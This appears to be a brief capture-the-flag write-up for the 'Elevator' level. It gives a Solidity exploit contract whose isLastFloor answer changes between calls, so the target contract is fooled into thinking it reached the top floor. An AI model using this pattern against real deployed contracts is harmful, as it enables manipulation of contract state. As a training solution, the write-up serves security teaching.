# Elevator

We're able to manipulate our state in `isLastFloor` so we can track when it's the second time the function is called.

```javascript
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    function goTo(uint _floor) public {}
}

contract Liar is Building {
    
    Elevator elevator;
    uint currentFloor;
    
    constructor(address _instance) {
        elevator = Elevator(_instance);
        currentFloor = 0;
    }
    
    function goUp() public {
        // It doesn't really matter which floor we go to.
        elevator.goTo(100);
    }
    
    function isLastFloor(uint _floor) external override returns (bool) {
        if (currentFloor == _floor) {
            return true;
        }
        currentFloor = _floor;
        return false;
    }
}
```